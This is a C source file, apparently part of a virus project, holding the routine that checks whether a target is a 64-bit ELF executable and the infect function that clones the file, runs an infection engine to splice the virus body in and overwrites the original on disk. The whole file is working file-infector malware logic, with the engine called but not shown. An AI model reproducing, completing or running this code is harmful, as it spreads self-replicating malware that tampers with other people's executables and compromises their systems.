#include "virus.h"
#include "syscalls.h"
#include "utils.h"
#include "errors.h"
#include "log.h"

static bool	is_elf64(const char *file)
{
	Elf64_Ehdr	hdr;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN_FAILED);

	if (sys_read(fd, &hdr, sizeof(Elf64_Ehdr)) < (ssize_t)sizeof(Elf64_Ehdr)
	|| memcmp(hdr.e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr.e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
	|| hdr.e_ident[EI_DATA] != ELFDATA2LSB        // not little endian
	|| hdr.e_entry == 0                           // no entry point
	|| hdr.e_phoff == 0                           // no program hdr table
	|| hdr.e_shoff == 0)                          // no section hdr table
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_U_NOT_ELF);
	}
	sys_close(fd);
	return true;
}

inline bool	infect(const struct virus_header *vhdr, const char *file)
{
	struct safe_ptr		file_ref     = {.ptr = NULL, .size = 0};
	struct safe_ptr		clone_ref    = {.ptr = NULL, .size = 0};
	struct virus_header	local_vhdr   = *vhdr;
	size_t			extra_size   = local_vhdr.full_virus_size * 2;
	size_t			shift_amount = 0;

	log_try_infecting(file);

	if (!is_elf64(file)
	|| !init_file_safe(&file_ref, file)
	|| !init_clone_safe(&clone_ref, file_ref.size, extra_size)
	|| !infection_engine(&local_vhdr, file_ref, clone_ref, &shift_amount)
	|| !write_file(clone_ref, file_ref.size + shift_amount, file))
	{
		free_accessor(&file_ref);
		free_accessor(&clone_ref);
		return errors(ERR_THROW, _ERR_T_INFECT);
	}
	free_accessor(&file_ref);
	free_accessor(&clone_ref);

	log_success();
	return true;
}
